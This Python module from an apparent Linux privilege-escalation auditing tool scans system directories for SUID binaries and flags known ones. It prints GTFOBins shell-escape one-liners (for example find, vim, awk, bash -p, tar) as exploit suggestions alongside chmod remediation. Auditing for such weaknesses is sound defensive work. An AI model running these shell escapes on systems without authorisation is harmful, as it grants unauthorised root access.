"""
SUID binary check module.
Identifies binaries with SUID bit set that can be exploited.
"""

import os
from typing import List, Set, Dict
from checks.base_check import BaseCheck, Finding, Severity
from utils.helpers import SystemHelpers


class SUIDCheck(BaseCheck):
    """Check for SUID binaries that can be exploited."""
    
    # Verified exploits from GTFOBins with accurate reliability
    GTFO_BINARIES: Dict[str, Dict] = {
        'find': {
            'exploit': 'find . -exec /bin/sh \\; -quit',
            'reliability': 'high',
            'notes': 'Classic SUID exploit - works on most systems'
        },
        'nmap': {
            'exploit': 'nmap --interactive',
            'reliability': 'high',
            'notes': 'Works if nmap has interactive mode (version < 7.70)'
        },
        'vim': {
            'exploit': 'vim -c ":!/bin/sh"',
            'reliability': 'high',
            'notes': 'Escapes to shell from vim'
        },
        'vi': {
            'exploit': 'vi -c ":!/bin/sh"',
            'reliability': 'high',
            'notes': 'Escapes to shell from vi'
        },
        'less': {
            'exploit': 'less /etc/passwd\nThen type: !/bin/sh',
            'reliability': 'high',
            'notes': 'Requires interactive session'
        },
        'awk': {
            'exploit': 'awk \'BEGIN {system("/bin/sh")}\'',
            'reliability': 'high',
            'notes': 'Works on most systems'
        },
        'python': {
            'exploit': 'python -c \'import os; os.execl("/bin/sh", "sh")\'',
            'reliability': 'high',
            'notes': 'Python must be installed'
        },
        'python3': {
            'exploit': 'python3 -c \'import os; os.execl("/bin/sh", "sh")\'',
            'reliability': 'high',
            'notes': 'Python3 must be installed'
        },
        'perl': {
            'exploit': 'perl -e \'exec "/bin/sh";\'',
            'reliability': 'high',
            'notes': 'Perl must be installed'
        },
        'bash': {
            'exploit': 'bash -p',
            'reliability': 'high',
            'notes': 'Uses -p to preserve privileges'
        },
        'tar': {
            'exploit': 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
            'reliability': 'high',
            'notes': 'Works on many systems with GNU tar'
        },
        'pkexec': {
            'exploit': 'pkexec /bin/sh',
            'reliability': 'conditional',
            'notes': 'Requires specific CVE (PwnKit) or proper polkit configuration'
        },
        'mount': {
            'exploit': 'mount -o bind /bin/bash /tmp/bash && /tmp/bash -p',
            'reliability': 'low',
            'notes': 'Limited success - requires specific conditions. Manual testing required.'
        }
    }
    
    def __init__(self):
        super().__init__()
        self.seen_paths: Set[str] = set()
    
    def run(self, *args, **kwargs) -> List[Finding]:
        """Find SUID binaries and identify exploitable ones."""
        self.seen_paths.clear()
        
        # Common paths to search for SUID binaries
        search_paths = [
            '/usr/bin', '/usr/sbin', '/bin', '/sbin',
            '/usr/local/bin', '/usr/local/sbin'
        ]
        
        # Add PATH directories but filter
        path_dirs = os.environ.get('PATH', '').split(':')
        search_paths.extend([d for d in path_dirs if d and not d.startswith('/home/')])
        search_paths = list(set(search_paths))
        
        for path in search_paths:
            if not os.path.exists(path) or not os.path.isdir(path):
                continue
            
            try:
                for root, dirs, files in os.walk(path):
                    # Limit depth to avoid too many files
                    if root.count(os.sep) - path.count(os.sep) > 3:
                        continue
                        
                    for file in files:
                        filepath = os.path.join(root, file)
                        
                        if os.path.isfile(filepath) and os.access(filepath, os.X_OK):
                            try:
                                st = os.stat(filepath)
                                # Check SUID bit
                                if st.st_mode & 0o4000:
                                    # Normalize path to handle symlinks
                                    real_path = SystemHelpers.normalize_path(filepath)
                                    
                                    # Skip if already processed this binary
                                    if real_path in self.seen_paths:
                                        continue
                                    
                                    self.seen_paths.add(real_path)
                                    self._analyze_suid_binary(real_path, filepath, st)
                            except (PermissionError, OSError):
                                continue
            except PermissionError:
                continue
        
        return self.findings
    
    def _analyze_suid_binary(self, real_path: str, original_path: str, stat_info):
        """Analyze a single SUID binary."""
        binary_name = os.path.basename(real_path)
        owner = self._get_owner(stat_info.st_uid)
        
        # Check if binary is in GTFO list
        if binary_name in self.GTFO_BINARIES:
            exploit_info = self.GTFO_BINARIES[binary_name]
            
            # Determine severity and reliability label
            if exploit_info['reliability'] == 'high':
                severity = Severity.CRITICAL
                reliability_label = "HIGH"
            elif exploit_info['reliability'] == 'conditional':
                severity = Severity.HIGH
                reliability_label = "CONDITIONAL"
            else:
                severity = Severity.MEDIUM
                reliability_label = "LOW"
            
            finding = Finding(
                title=f"Exploitable SUID Binary: {binary_name}",
                description=f"Found SUID binary at {original_path} owned by {owner}. This binary has known privilege escalation vectors.",
                severity=severity,
                exploit_suggestion=f"[RELIABILITY: {reliability_label}]\n{exploit_info['exploit']}\n\nNote: {exploit_info['notes']}",
                remediation=f"Remove SUID bit: chmod u-s {original_path}",
                metadata={
                    'path': original_path,
                    'real_path': real_path,
                    'binary': binary_name,
                    'owner': owner,
                    'reliability': exploit_info['reliability']
                }
            )
            self.findings.append(finding)
        else:
            # Unknown binary - only add if high-value
            pass
    
    def _get_owner(self, uid: int) -> str:
        """Get username from UID."""
        try:
            import pwd
            return pwd.getpwuid(uid).pw_name
        except:
            return str(uid)